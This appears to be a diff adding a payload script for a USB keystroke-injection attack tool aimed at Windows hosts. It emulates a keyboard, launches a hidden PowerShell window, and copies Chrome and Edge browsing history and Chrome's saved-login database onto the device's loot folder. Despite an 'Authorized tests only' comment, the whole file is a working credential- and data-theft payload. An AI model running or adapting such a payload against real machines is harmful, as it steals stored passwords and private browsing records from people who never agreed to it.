@@ -1,0 +1,25 @@
+#!/bin/bash
+# browser_grab (Windows host, HID+STORAGE) - copy Chrome/Edge history +
+# saved-login DBs out of the user profile into loot/. Authorized tests only.
+LED SETUP
+ATTACKMODE HID STORAGE
+sleep 3
+mkdir -p /root/udisk/loot
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+# Single-quote the paths so PowerShell keeps the spaces/& chars literal.
+QUACK "REM browser_grab" \
+    "DEFAULT_DELAY 40" \
+    "GUI r" "DELAY 400" \
+    "STRING powershell -NoP -W Hidden -c \"Copy-Item 'C:\\Users\\\$env:USERNAME\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History','C:\\Users\\\$env:USERNAME\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data','C:\\Users\\\$env:USERNAME\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History' E:\\loot\\ -ErrorAction SilentlyContinue\"" "ENTER" \
+    "DELAY 10000"
+if [ -s /root/udisk/loot/History ]; then
+    echo "[+] browser DBs -> loot/History, loot/Login Data"
+else
+    echo "[!] no browser DBs captured (not MS Windows, or E:\ not the drive)"
+fi
+LED FINISH
+exit 0
